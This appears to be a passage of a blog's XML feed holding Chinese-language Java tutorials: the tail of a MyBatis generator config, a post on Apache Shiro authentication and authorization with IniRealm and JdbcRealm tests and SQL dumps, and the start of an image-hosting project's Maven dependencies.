&lt;!-- 指定数据库连接驱动jara地址 --&gt;    &lt;classPathEntry            location=&quot;${generator.location}&quot; /&gt;    &lt;!-- 一个数据库一个context --&gt;    &lt;context id=&quot;sqlserverTables&quot;&gt;        &lt;!-- 生成的pojo，将implements Serializable --&gt;        &lt;plugin type=&quot;org.mybatis.generator.plugins.SerializablePlugin&quot;&gt;&lt;/plugin&gt;        &lt;!-- 注释 --&gt;        &lt;commentGenerator&gt;            &lt;property name=&quot;suppressAllComments&quot; value=&quot;true&quot; /&gt;&lt;!-- 是否取消注释 --&gt;            &lt;!-- &lt;property name=&quot;suppressDate&quot; value=&quot;true&quot; /&gt;  是否生成注释代时间戳 --&gt;        &lt;/commentGenerator&gt;        &lt;!-- 数据库链接URL、用户名、密码 --&gt;        &lt;jdbcConnection driverClass=&quot;${db.example.driver}&quot;                        connectionURL=&quot;${db.example.url}&quot; userId=&quot;${db.example.username}&quot;                        password=&quot;${db.example.password}&quot;&gt;        &lt;/jdbcConnection&gt;        &lt;!-- 类型转换 --&gt;        &lt;javaTypeResolver&gt;            &lt;!-- 默认false，把JDBC DECIMAL 和 NUMERIC 类型解析为 Integer true，把JDBC DECIMAL                和 NUMERIC 类型解析为java.math.BigDecimal --&gt;            &lt;property name=&quot;forceBigDecimals&quot; value=&quot;false&quot; /&gt;        &lt;/javaTypeResolver&gt;        &lt;!-- 生成model模型，对应的包路径，以及文件存放路径(targetProject)，targetProject可以指定具体的路径,如./src/main/java，            也可以使用“MAVEN”来自动生成，这样生成的代码会在target/generatord-source目录下 --&gt;        &lt;javaModelGenerator targetPackage=&quot;${generator.targetPackage}&quot;                            targetProject=&quot;./src/main/java&quot;&gt;            &lt;!-- 是否在当前路径下新加一层schema,eg：fase路径com.oop.eksp.user.model， true:com.oop.eksp.user.model.[schemaName] --&gt;            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt;            &lt;!-- 从数据库返回的值被清理前后的空格 --&gt;            &lt;property name=&quot;trimStrings&quot; value=&quot;true&quot; /&gt;        &lt;/javaModelGenerator&gt;        &lt;!--对应的mapper.xml文件 --&gt;        &lt;sqlMapGenerator targetPackage=&quot;${generator.targetPackage}&quot;                         targetProject=&quot;./src/main/java&quot;&gt;            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt;        &lt;/sqlMapGenerator&gt;        &lt;!-- 对应的Mapper接口类文件 --&gt;        &lt;javaClientGenerator type=&quot;XMLMAPPER&quot;                             targetPackage=&quot;${generator.targetPackage}&quot; targetProject=&quot;./src/main/java&quot;&gt;            &lt;property name=&quot;enableSubPackages&quot; value=&quot;false&quot; /&gt;        &lt;/javaClientGenerator&gt;        &lt;!-- 列出要生成代码的所有表，这里配置的是不生成Example文件 --&gt;        &lt;!-- schema即为数据库名 tableName为对应的数据库表 domainObjectName是要生成的实体类 enable*ByExample                   是否生成 example类   --&gt;        &lt;table tableName=&quot;${gererator.tableName}&quot; domainObjectName=&quot;${gererator.objectName}&quot;               schema=&quot;${gererator.schema}&quot;               enableCountByExample=&quot;false&quot; enableUpdateByExample=&quot;false&quot;               enableDeleteByExample=&quot;false&quot; enableSelectByExample=&quot;false&quot;               selectByExampleQueryId=&quot;false&quot;&gt;            &lt;!-- 忽略列，不生成bean 字段            &lt;ignoreColumn column=&quot;FRED&quot; /&gt;--&gt;            &lt;!-- 指定列的java数据类型            &lt;columnOverride column=&quot;LONG_VARCHAR_FIELD&quot; jdbcType=&quot;VARCHAR&quot; /&gt;  --&gt;            &lt;!-- 用于指定生成实体类时是否使用实际的列名作为实体类的属性名。false是 Camel Case风格--&gt;            &lt;property name=&quot;useActualColumnNames&quot; value=&quot;false&quot; /&gt;        &lt;/table&gt;    &lt;/context&gt;&lt;/generatorConfiguration&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiroの基础知识</title>
      <link href="/2019/05/08/shironoji-chu-zhi-shi/"/>
      <url>/2019/05/08/shironoji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiroの基础知识"><a href="#Shiroの基础知识" class="headerlink" title="Shiroの基础知识"></a>Shiroの基础知识</h1><h2 id="Authenticator-用户认证"><a href="#Authenticator-用户认证" class="headerlink" title="Authenticator(用户认证)"></a>Authenticator(用户认证)</h2><blockquote><h3 id="用户认证，用户去访问系统，系统要验证用户身份的合法性"><a href="#用户认证，用户去访问系统，系统要验证用户身份的合法性" class="headerlink" title="用户认证，用户去访问系统，系统要验证用户身份的合法性"></a>用户认证，用户去访问系统，系统要验证用户身份的合法性</h3></blockquote><h2 id="认证方法"><a href="#认证方法" class="headerlink" title="认证方法"></a>认证方法</h2><p> 最常用的用户身份验证的方法：1、用户名密码方式、2、指纹打卡机、3、基于证书验证方法。。系统验证用户身份合法，用户方可访问系统的资源。</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><ul><li>创建一个简单的Realm（Realm 充当了 Shiro 与应用安全数据间的“桥梁”或者“连接器”。）</li><li>创建一个SecurityManager </li><li>subject主体发送请求</li><li>用户名密码认证</li><li>Authenticator认证</li><li>Realm验证数据<h2 id="测试Code"><a href="#测试Code" class="headerlink" title="测试Code"></a>测试Code</h2><pre><code>package com.imgurl;</code></pre></li></ul><p>import org.apache.shiro.SecurityUtils;<br>import org.apache.shiro.authc.UsernamePasswordToken;<br>import org.apache.shiro.mgt.DefaultSecurityManager;<br>import org.apache.shiro.realm.SimpleAccountRealm;<br>import org.apache.shiro.subject.Subject;<br>import org.junit.Before;<br>import org.junit.Test;</p><p>public class Authrnrization {<br>//    创建realm<br>    SimpleAccountRealm simpleAccountRealm = new SimpleAccountRealm();</p><pre><code>@Beforepublic void  add() {    simpleAccountRealm.addAccount(&quot;admin&quot;,&quot;12345&quot;);}@Testpublic void checkauthrization(){</code></pre><p>//        1.创建一个管理器<br>        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();<br>        defaultSecurityManager.setRealm(simpleAccountRealm);</p><p>//        2.主体发动请求<br>        SecurityUtils.setSecurityManager(defaultSecurityManager);<br>        Subject subject = SecurityUtils.getSubject();</p><p>//        3.认证<br>        UsernamePasswordToken token = new UsernamePasswordToken(“admin”,”12345”);<br>        subject.login(token);</p><pre><code>    System.out.println(&quot;认证：&quot;+subject.isAuthenticated());}</code></pre><p>}</p><pre><code>## Authorizer(用户授权)&gt; 用户授权，简单理解为访问控制，在用户认证通过后，系统对用户访问资源进行控制，用户具有资源的访问权限方可访问。## 授权流程-  创建一个SecurityManager -  主体授权-  SecurityManager授权-  Authorizer授权-  Realm获取用户角色权限数据## 测试Code</code></pre><p>package com.imgurl;</p><p>import org.apache.shiro.SecurityUtils;<br>import org.apache.shiro.authc.UsernamePasswordToken;<br>import org.apache.shiro.mgt.DefaultSecurityManager;<br>import org.apache.shiro.realm.SimpleAccountRealm;<br>import org.apache.shiro.subject.Subject;<br>import org.junit.Before;<br>import org.junit.Test;</p><p>public class roles {<br>    SimpleAccountRealm simpleAccountRealm = new SimpleAccountRealm();<br>    @Before<br>    public void add() {<br>        simpleAccountRealm.addAccount(“admin”,”12345”,”Manager”,”Otheruser”);<br>    }</p><pre><code>@Testpublic void Authorizer(){    //    1.创建securityManager    DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();    defaultSecurityManager.setRealm(simpleAccountRealm);</code></pre><p>//        2.主体发送请求授权<br>        SecurityUtils.setSecurityManager(defaultSecurityManager);<br>        Subject subject = SecurityUtils.getSubject();</p><p>//        3.authorizer授权<br>        UsernamePasswordToken token = new UsernamePasswordToken(“admin”,”12345”);<br>        subject.login(token);<br>        System.out.println(“认证：”+subject.isAuthenticated());<br>        subject.checkRoles(“Manager”,”Otheruser”);<br>    }<br>}</p><pre><code>## Realm&gt; ###   Realm: 域，Shiro 从 Realm 中获取用户，角色，权限信息。可以把 Relam 看成 DataSource，即安全数据源。 前面我们使用的是SimpleAccountRealm，并通过addAccount来预设用户信息。### IniRealm&gt; IniRealm 顾名思义，即通过读取 .ini 文件来获取用户，角色，权限信息。 创建xxx.ini文件(在Test目录下创建resource)</code></pre><p>[users]<br>admin = 123456,Manager<br>fun = 123456,Otheruser<br>用户名 = 密码,角色<br>[roles]<br>Manager = user:delete,user:add,user:update,user:select<br>Otheruser = user:select<br>角色 = 权限</p><pre><code>#### 测试Code</code></pre><p>package com.imgurl;</p><p>import org.apache.shiro.SecurityUtils;<br>import org.apache.shiro.authc.AuthenticationException;<br>import org.apache.shiro.authc.UsernamePasswordToken;<br>import org.apache.shiro.mgt.DefaultSecurityManager;<br>import org.apache.shiro.realm.text.IniRealm;<br>import org.apache.shiro.subject.Subject;<br>import org.junit.Test;</p><p>import java.util.Arrays;</p><p>public class IniRealmTest {<br>    @Test<br>    public void IniRealm(){</p><pre><code>    DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();    IniRealm iniRealm = new IniRealm(&quot;classpath:shiro.ini&quot;);    defaultSecurityManager.setRealm(iniRealm);    SecurityUtils.setSecurityManager(defaultSecurityManager);    Subject subject = SecurityUtils.getSubject();    UsernamePasswordToken token = new UsernamePasswordToken(&quot;fun&quot;,&quot;123456&quot;);    try {        subject.login(token);        System.out.println(&quot;Authenticator:&quot;+subject.isAuthenticated());        System.out.println(&quot;登陆成功&quot;);    }catch (AuthenticationException e){        e.printStackTrace();        System.out.println(&quot;认证失败&quot;);    }    System.out.println(&quot;--------角色验证---------&quot;);    System.out.println(&quot;是否具备Manger权限：&quot;+subject.hasRole(&quot;Manager&quot;));    System.out.println(&quot;是否具备Otheruser权限：&quot;+subject.hasRole(&quot;Otheruser&quot;));    System.out.println(&quot;是否同事具备Manger和Otheruser权限：&quot;+subject.hasAllRoles(Arrays.asList(&quot;Manager&quot;,&quot;Otheruser&quot;)));    System.out.println(&quot;---------权限------------&quot;);    System.out.println(&quot;是否具备user:select权限：&quot;+subject.isPermitted(&quot;user:select&quot;));    System.out.println(&quot;是否具备user:add权限：&quot;+subject.isPermitted(&quot;user:add&quot;));    System.out.println(&quot;是否具备user:delete权限：&quot;+subject.isPermitted(&quot;user:delete&quot;));    System.out.println(&quot;是否具备user:update权限：&quot;+subject.isPermitted(&quot;user:update&quot;));}</code></pre><p>}</p><pre><code></code></pre><p>Authenticator:true<br>登陆成功<br>——–角色验证———<br>是否具备Manger权限：false<br>是否具备Otheruser权限：true<br>是否同事具备Manger和Otheruser权限：false<br>———权限————<br>是否具备user:select权限：true<br>是否具备user:add权限：false<br>是否具备user:delete权限：false<br>是否具备user:update权限：false</p><pre><code>### JdbcRealm&gt; dbcRelam 顾名思义，即通过通过访问数据库来获取用户，角色，权限信息。#### 创建数据</code></pre><hr><p>– 主机:                           127.0.0.1<br>– 服务器版本:                        10.3.10-MariaDB - mariadb.org binary distribution<br>– 服务器操作系统:                      Win64<br>– HeidiSQL 版本:                  9.4.0.5125</p><hr><p>/<em>!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;<br>/</em>!40101 SET NAMES utf8 <em>/;<br>/</em>!50503 SET NAMES utf8mb4 <em>/;<br>/</em>!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 <em>/;<br>/</em>!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=’NO_AUTO_VALUE_ON_ZERO’ */;</p><p>– 导出  表 funimg.roles_permissions 结构<br>CREATE TABLE IF NOT EXISTS <code>roles_permissions</code> (<br>  <code>id</code> bigint(20) NOT NULL AUTO_INCREMENT,<br>  <code>role_name</code> varchar(100) DEFAULT NULL,<br>  <code>permission</code> varchar(100) DEFAULT NULL,<br>  PRIMARY KEY (<code>id</code>),<br>  UNIQUE KEY <code>idx_roles_permissions</code> (<code>role_name</code>,<code>permission</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;</p><p>– 正在导出表  funimg.roles_permissions 的数据：~5 rows (大约)<br>/<em>!40000 ALTER TABLE <code>roles_permissions</code> DISABLE KEYS */;<br>INSERT INTO <code>roles_permissions</code> (<code>id</code>, <code>role_name</code>, <code>permission</code>) VALUES<br>    (6, ‘Manager’, ‘user:add’),<br>    (1, ‘Manager’, ‘user:delete’),<br>    (2, ‘Manager’, ‘user:select’),<br>    (5, ‘Manager’, ‘user:update’),<br>    (7, ‘Otheruser’, ‘user:select’);<br>/</em>!40000 ALTER TABLE <code>roles_permissions</code> ENABLE KEYS */;</p><p>– 导出  表 funimg.users 结构<br>CREATE TABLE IF NOT EXISTS <code>users</code> (<br>  <code>id</code> bigint(20) NOT NULL AUTO_INCREMENT,<br>  <code>username</code> varchar(100) DEFAULT NULL,<br>  <code>password</code> varchar(100) DEFAULT NULL,<br>  <code>password_salt</code> varchar(100) DEFAULT NULL,<br>  PRIMARY KEY (<code>id</code>),<br>  UNIQUE KEY <code>idx_users_username</code> (<code>username</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;</p><p>– 正在导出表  funimg.users 的数据：~2 rows (大约)<br>/<em>!40000 ALTER TABLE <code>users</code> DISABLE KEYS */;<br>INSERT INTO <code>users</code> (<code>id</code>, <code>username</code>, <code>password</code>, <code>password_salt</code>) VALUES<br>    (1, ‘admin’, ‘123456’, NULL),<br>    (2, ‘fun’, ‘123456’, NULL);<br>/</em>!40000 ALTER TABLE <code>users</code> ENABLE KEYS */;</p><p>– 导出  表 funimg.user_roles 结构<br>CREATE TABLE IF NOT EXISTS <code>user_roles</code> (<br>  <code>id</code> bigint(20) NOT NULL AUTO_INCREMENT,<br>  <code>username</code> varchar(100) DEFAULT NULL,<br>  <code>role_name</code> varchar(100) DEFAULT NULL,<br>  PRIMARY KEY (<code>id</code>),<br>  UNIQUE KEY <code>idx_user_roles</code> (<code>username</code>,<code>role_name</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;</p><p>– 正在导出表  funimg.user_roles 的数据：~2 rows (大约)<br>/<em>!40000 ALTER TABLE <code>user_roles</code> DISABLE KEYS */;<br>INSERT INTO <code>user_roles</code> (<code>id</code>, <code>username</code>, <code>role_name</code>) VALUES<br>    (1, ‘admin’, ‘Manager’),<br>    (2, ‘fun’, ‘Otheruser’);<br>/</em>!40000 ALTER TABLE <code>user_roles</code> ENABLE KEYS */;</p><p>/<em>!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, ‘’) */;<br>/</em>!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) <em>/;<br>/</em>!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</p><pre><code>### 测试Code</code></pre><p>package com.imgurl;</p><p>import com.alibaba.druid.pool.DruidDataSource;<br>import org.apache.shiro.SecurityUtils;<br>import org.apache.shiro.authc.AuthenticationException;<br>import org.apache.shiro.authc.UsernamePasswordToken;<br>import org.apache.shiro.mgt.DefaultSecurityManager;<br>import org.apache.shiro.subject.Subject;<br>import org.junit.Test;<br>import org.apache.shiro.realm.jdbc.JdbcRealm;</p><p>import java.util.Arrays;</p><p>public class TestJdbcRealm {<br>    DruidDataSource datasource = new DruidDataSource();<br>    {<br>        datasource.setUrl(“jdbc:mysql://localhost:3306/test”);<br>        datasource.setUsername(“root”);<br>        datasource.setPassword(“root”);<br>    }</p><pre><code>@Testpublic void JdbcRealmTest(){</code></pre><p>//        1.创建JdbcRealm<br>        JdbcRealm jdbcRealm = new JdbcRealm();<br>        jdbcRealm.setDataSource(datasource);  //设置数据源<br>        jdbcRealm.setPermissionsLookupEnabled(true);  //设置可查看用户权限</p><p>//        2.创建安全管理器<br>        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();<br>        defaultSecurityManager.setRealm(jdbcRealm);</p><p>//        3.主题请求<br>        SecurityUtils.setSecurityManager(defaultSecurityManager);<br>        Subject subject = SecurityUtils.getSubject();</p><p>//        4.用户认证<br>        UsernamePasswordToken token = new UsernamePasswordToken(“admin”,”123456”);<br>        try {<br>            subject.login(token);<br>            System.out.println(“登录成功”);</p><pre><code>        System.out.println(&quot;--------角色验证---------&quot;);        System.out.println(&quot;是否具备Manger权限：&quot;+subject.hasRole(&quot;Manager&quot;));        System.out.println(&quot;是否具备Otheruser权限：&quot;+subject.hasRole(&quot;Otheruser&quot;));        System.out.println(&quot;是否同事具备Manger和Otheruser权限：&quot;+subject.hasAllRoles(Arrays.asList(&quot;Manager&quot;,&quot;Otheruser&quot;)));        System.out.println(&quot;---------权限------------&quot;);        System.out.println(&quot;是否具备user:select权限：&quot;+subject.isPermitted(&quot;user:select&quot;));        System.out.println(&quot;是否具备user:add权限：&quot;+subject.isPermitted(&quot;user:add&quot;));        System.out.println(&quot;是否具备user:delete权限：&quot;+subject.isPermitted(&quot;user:delete&quot;));        System.out.println(&quot;是否具备user:update权限：&quot;+subject.isPermitted(&quot;user:update&quot;));    }catch (AuthenticationException e){        e.printStackTrace();        System.out.println(&quot;登录失败&quot;);    }}</code></pre><p>}</p><pre><code></code></pre><p>登录成功<br>——–角色验证———<br>是否具备Manger权限：true<br>是否具备Otheruser权限：false<br>是否同事具备Manger和Otheruser权限：false<br>———权限————<br>是否具备user:select权限：true<br>是否具备user:add权限：true<br>是否具备user:delete权限：true<br>是否具备user:update权限：true</p><pre><code>你会发现我们利用数据库也发现有mysql语句啊。因为我们使用了JdbcRealm的内置语句。我们是按照它语句来命名数据表字段的。下面是代码片段&gt;  JdbcRealm.class  </code></pre><p>public class JdbcRealm extends AuthorizingRealm {<br>    protected static final String DEFAULT_AUTHENTICATION_QUERY = “select password from users where username = ?”;<br>    protected static final String DEFAULT_SALTED_AUTHENTICATION_QUERY = “select password, password_salt from users where username = ?”;<br>    protected static final String DEFAULT_USER_ROLES_QUERY = “select role_name from user_roles where username = ?”;<br>    protected static final String DEFAULT_PERMISSIONS_QUERY = “select permission from roles_permissions where role_name = ?”;<br>    private static final Logger log = LoggerFactory.getLogger(JdbcRealm.class);<br>    protected DataSource dataSource;<br>    protected String authenticationQuery = “select password from users where username = ?”;<br>    protected String userRolesQuery = “select role_name from user_roles where username = ?”;<br>    protected String permissionsQuery = “select permission from roles_permissions where role_name = ?”;<br>    protected boolean permissionsLookupEnabled = false;<br>    protected JdbcRealm.SaltStyle saltStyle;</p><pre><code>### 自定义数据库及语句#### 创建新表</code></pre><hr><p>– 主机:                           127.0.0.1<br>– 服务器版本:                        10.3.10-MariaDB - mariadb.org binary distribution<br>– 服务器操作系统:                      Win64<br>– HeidiSQL 版本:                  9.4.0.5125</p><hr><p>/<em>!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;<br>/</em>!40101 SET NAMES utf8 <em>/;<br>/</em>!50503 SET NAMES utf8mb4 <em>/;<br>/</em>!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 <em>/;<br>/</em>!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=’NO_AUTO_VALUE_ON_ZERO’ */;</p><p>– 导出  表 shirotest.sys_permissions 结构<br>CREATE TABLE IF NOT EXISTS <code>sys_permissions</code> (<br>  <code>id</code> int(11) NOT NULL AUTO_INCREMENT,<br>  <code>role_name</code> varchar(50) DEFAULT ‘0’,<br>  <code>permission</code> varchar(50) DEFAULT ‘0’,<br>  PRIMARY KEY (<code>id</code>),<br>  UNIQUE KEY <code>permissions</code> (<code>role_name</code>,<code>permission</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=latin1;</p><p>– 正在导出表  shirotest.sys_permissions 的数据：~2 rows (大约)<br>/<em>!40000 ALTER TABLE <code>sys_permissions</code> DISABLE KEYS */;<br>INSERT INTO <code>sys_permissions</code> (<code>id</code>, <code>role_name</code>, <code>permission</code>) VALUES<br>    (1, ‘root’, ‘user:add’),<br>    (2, ‘root’, ‘user:delete’),<br>    (4, ‘root’, ‘user:select’),<br>    (3, ‘root’, ‘user:update’),<br>    (5, ‘user’, ‘user:select’);<br>/</em>!40000 ALTER TABLE <code>sys_permissions</code> ENABLE KEYS */;</p><p>– 导出  表 shirotest.sys_roles 结构<br>CREATE TABLE IF NOT EXISTS <code>sys_roles</code> (<br>  <code>id</code> int(11) NOT NULL AUTO_INCREMENT COMMENT ‘ID’,<br>  <code>username</code> varchar(50) NOT NULL DEFAULT ‘0’ COMMENT ‘用户名’,<br>  <code>role_name</code> varchar(50) NOT NULL DEFAULT ‘0’ COMMENT ‘角色名称’,<br>  PRIMARY KEY (<code>id</code>),<br>  UNIQUE KEY <code>username_rolename</code> (<code>username</code>,<code>role_name</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</p><p>– 正在导出表  shirotest.sys_roles 的数据：~2 rows (大约)<br>/<em>!40000 ALTER TABLE <code>sys_roles</code> DISABLE KEYS */;<br>INSERT INTO <code>sys_roles</code> (<code>id</code>, <code>username</code>, <code>role_name</code>) VALUES<br>    (1, ‘admin’, ‘root’),<br>    (2, ‘fun’, ‘user’);<br>/</em>!40000 ALTER TABLE <code>sys_roles</code> ENABLE KEYS */;</p><p>– 导出  表 shirotest.sys_users 结构<br>CREATE TABLE IF NOT EXISTS <code>sys_users</code> (<br>  <code>id</code> int(11) NOT NULL AUTO_INCREMENT COMMENT ‘用户ID’,<br>  <code>username</code> varchar(50) NOT NULL DEFAULT ‘0’ COMMENT ‘用户名’,<br>  <code>password</code> varchar(50) NOT NULL DEFAULT ‘0’ COMMENT ‘用户密码’,<br>  <code>salt</code> varchar(100) NOT NULL DEFAULT ‘0’ COMMENT ‘盐值’,<br>  <code>last_ip</code> varchar(100) NOT NULL DEFAULT ‘0’ COMMENT ‘最后登录IP’,<br>  PRIMARY KEY (<code>id</code>),<br>  UNIQUE KEY <code>user_username</code> (<code>username</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</p><p>– 正在导出表  shirotest.sys_users 的数据：~2 rows (大约)<br>/<em>!40000 ALTER TABLE <code>sys_users</code> DISABLE KEYS */;<br>INSERT INTO <code>sys_users</code> (<code>id</code>, <code>username</code>, <code>password</code>, <code>salt</code>, <code>last_ip</code>) VALUES<br>    (1, ‘admin’, ‘123456’, ‘0’, ‘0’),<br>    (2, ‘fun’, ‘123456’, ‘0’, ‘0’);<br>/</em>!40000 ALTER TABLE <code>sys_users</code> ENABLE KEYS */;</p><p>/<em>!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, ‘’) */;<br>/</em>!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) <em>/;<br>/</em>!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</p><pre><code>其实数据库都差不多，只是没有按照内置的命名。### 测试Code</code></pre><p>package com.imgurl;</p><p>import com.alibaba.druid.pool.DruidDataSource;<br>import org.apache.shiro.SecurityUtils;<br>import org.apache.shiro.authc.AuthenticationException;<br>import org.apache.shiro.authc.UsernamePasswordToken;<br>import org.apache.shiro.mgt.DefaultSecurityManager;<br>import org.apache.shiro.realm.jdbc.JdbcRealm;<br>import org.apache.shiro.subject.Subject;<br>import org.junit.Test;</p><p>import java.util.Arrays;</p><p>public class CustomizeJdbcRealm {<br>    DruidDataSource datasource = new DruidDataSource();<br>    {<br>        datasource.setUrl(“jdbc:mysql://localhost:3306/shirotest”);<br>        datasource.setUsername(“root”);<br>        datasource.setPassword(“root”);<br>    }</p><pre><code>@Testpublic void CustomizeJdbcRealmTest(){</code></pre><p>//        1.创建JdbcRealm<br>        JdbcRealm jdbcRealm = new JdbcRealm();<br>        jdbcRealm.setDataSource(datasource);<br>        jdbcRealm.setPermissionsLookupEnabled(true);</p><pre><code>    String sql = &quot;select password from sys_users where username = ?&quot;;    jdbcRealm.setAuthenticationQuery(sql);    String rolesql = &quot;select role_name from sys_roles where username = ?&quot;;    jdbcRealm.setUserRolesQuery(rolesql);    String permissionsql = &quot;select permission from sys_permissions where role_name = ?&quot;;    jdbcRealm.setPermissionsQuery(permissionsql);</code></pre><p>//        2.创建安全管理器<br>        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();<br>        defaultSecurityManager.setRealm(jdbcRealm);</p><p>//        2.主体请求<br>        SecurityUtils.setSecurityManager(defaultSecurityManager);<br>        Subject subject = SecurityUtils.getSubject();</p><p>//        3.认证<br>        UsernamePasswordToken token = new UsernamePasswordToken(“fun”,”123456”);<br>        try {<br>            subject.login(token);</p><pre><code>        System.out.println(&quot;认证是否成功：&quot;+subject.isAuthenticated());        System.out.println(&quot;--------角色验证---------&quot;);        System.out.println(&quot;是否具备root权限：&quot;+subject.hasRole(&quot;root&quot;));        System.out.println(&quot;是否具备user权限：&quot;+subject.hasRole(&quot;user&quot;));        System.out.println(&quot;是否同事具备root和user权限：&quot;+subject.hasAllRoles(Arrays.asList(&quot;root&quot;,&quot;user&quot;)));        System.out.println(&quot;---------权限------------&quot;);        System.out.println(&quot;是否具备user:select权限：&quot;+subject.isPermitted(&quot;user:select&quot;));        System.out.println(&quot;是否具备user:add权限：&quot;+subject.isPermitted(&quot;user:add&quot;));        System.out.println(&quot;是否具备user:delete权限：&quot;+subject.isPermitted(&quot;user:delete&quot;));        System.out.println(&quot;是否具备user:update权限：&quot;+subject.isPermitted(&quot;user:update&quot;));    }catch (AuthenticationException e) {        e.printStackTrace();        System.out.println(&quot;认证失败&quot;);    }}</code></pre><p>}</p><pre><code></code></pre><p>认证是否成功：true<br>——–角色验证———<br>是否具备root权限：false<br>是否具备user权限：true<br>是否同事具备root和user权限：false<br>———权限————<br>是否具备user:select权限：true<br>是否具备user:add权限：false<br>是否具备user:delete权限：false<br>是否具备user:update权限：false<br>```</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaのImgUrl</title>
      <link href="/2019/05/05/javanoimgurl/"/>
      <url>/2019/05/05/javanoimgurl/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaのImgUrl"><a href="#JavaのImgUrl" class="headerlink" title="JavaのImgUrl"></a>JavaのImgUrl</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>简单的一个图床网站。需要注册才能上传文件，管理员可以无限制的上传图片，普通注册用户一天只能5张图片。</p><h2 id="创建环境"><a href="#创建环境" class="headerlink" title="创建环境"></a>创建环境</h2><ul><li>编辑器：IDEA</li><li>数据库：MariaDB</li><li>后端框架：SSM+Shiro</li><li>前端框架：Boostrap + Flat UI</li><li>服务器：Tomcat8.5以上</li></ul><h2 id="1-项目步骤"><a href="#1-项目步骤" class="headerlink" title="1.项目步骤"></a>1.项目步骤</h2><h3 id="1-1Maven创建项目"><a href="#1-1Maven创建项目" class="headerlink" title="1.1Maven创建项目"></a>1.1Maven创建项目</h3><blockquote><p><a href="https://kalifun.top/archives/184" target="_blank" rel="noopener">IDEA 简单创建SSM框架</a></p></blockquote><h3 id="1-2修改pom-xml"><a href="#1-2修改pom-xml" class="headerlink" title="1.2修改pom.xml"></a>1.2修改pom.xml</h3><pre><code>    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-spring --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-ehcache --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-ehcache&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-quartz --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-quartz&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-web --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-core --&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;      &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;      &lt;version&gt;1.4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;!--excel--&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;      &lt;artifactId&gt;poi&lt;/artifactId&gt;      &lt;version&gt;4.1.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;jstl&lt;/groupId&gt;      &lt;artifactId&gt;jstl&lt;/artifactId&gt;      &lt;version&gt;1.2&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --&gt;    &lt;dependency&gt;      